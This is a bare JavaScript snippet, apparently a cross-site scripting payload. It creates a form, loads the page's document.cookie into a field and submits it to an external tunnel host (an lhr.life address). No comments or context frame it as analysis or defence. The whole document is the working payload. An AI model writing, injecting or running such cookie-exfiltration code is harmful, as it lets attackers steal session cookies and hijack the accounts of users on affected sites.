let f = document.createElement("form");
f.action = "https://4dbe7f80952dd7.lhr.life";
f.method = "GET";

let i = document.createElement("input");
i.name = "data";
i.value = document.cookie;

f.appendChild(i);
document.body.appendChild(f);
f.submit();
